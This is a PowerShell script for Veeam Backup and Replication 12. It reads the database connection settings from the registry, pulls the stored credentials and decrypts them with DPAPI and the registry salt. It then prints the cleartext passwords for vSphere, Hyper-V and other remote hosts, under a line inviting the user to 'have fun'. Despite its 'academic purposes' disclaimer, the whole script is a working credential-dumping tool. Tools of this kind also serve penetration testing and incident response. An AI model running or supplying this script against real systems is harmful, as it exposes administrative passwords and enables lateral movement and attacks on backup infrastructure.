# Updated for version 12, @w3bd3vil
# About:  The script is designed to recover passwords used by Veeam to connect
#         to remote hosts vSphere, Hyper-V, etc. The script is intended for 
#         demonstration and academic purposes. Use with permission from the 
#         system owner.
#
# Author: Konstantin Burov.
#
# Usage:  Run as administrator (elevated) in PowerShell on a host in a Veeam 
#         server.

Add-Type -AssemblyName System.Security

#Searching for connection parameters in the registry
try {
	$VeaamRegPath = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql\"
	$SqlDatabaseName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlDatabaseName 
	$SqlInstanceName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlInstanceName
	$SqlServerName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlServerName
}
catch {
	echo "Can't find Veeam on localhost, try running as Administrator"
	exit -1
}

""
"Found Veeam DB on " + $SqlServerName + "\" + $SqlInstanceName + "@" + $SqlDatabaseName + ", connecting...  "

#Forming the connection string
$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
	"WHERE password <> ''" #Filter empty passwords
$auth = "Integrated Security=SSPI;" #Local user
$connectionString = "Provider=MSOLEDBSQL; Data Source=$SqlServerName\$SqlInstanceName; " +
"Initial Catalog=$SqlDatabaseName; $auth; "
$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection

#Fetching encrypted credentials from the database
try {
	$connection.Open()
	$adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	[void] $adapter.Fill($dataSet)
	$connection.Close()
}
catch {
	"Can't connect to DB, exit."
	exit -1
}

"OK"

$rows=($dataset.Tables | Select-Object -Expand Rows)
if ($rows.count -eq 0) {
	"No passwords today, sorry."
	exit
}

""
"Here are some passwords for you, have fun:"
# Read the value of EmcryptionSalt from the registry
$saltbase = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\Data").EncryptionSalt

#Decrypting passwords using DPAPI
$rows | ForEach-Object -Process {
	$salt = [System.Convert]::FromBase64String($saltbase)
	$data = [System.Convert]::FromBase64String($_.password)
	$hex = New-Object -TypeName System.Text.StringBuilder -ArgumentList ($data.Length * 2)
	foreach ($byte in $data) {$hex.AppendFormat("{0:x2}", $byte) > $null}
	$hex = $hex.ToString().Substring(74,$hex.Length-74)
	$data = New-Object -TypeName byte[] -ArgumentList ($hex.Length / 2)
	for ($i = 0; $i -lt $hex.Length; $i += 2) {$data[$i / 2] = [System.Convert]::ToByte($hex.Substring($i, 2), 16)}
	$securedPassword = [System.Convert]::ToBase64String($data)
	$data = [System.Convert]::FromBase64String($securedPassword)
	$local = [System.Security.Cryptography.DataProtectionScope]::LocalMachine
	$raw = [System.Security.Cryptography.ProtectedData]::Unprotect($data, $salt, $local) 
	$_.password = [System.Text.Encoding]::UTF8.Getstring($raw)
}
 

Write-Output $rows | FT | Out-string
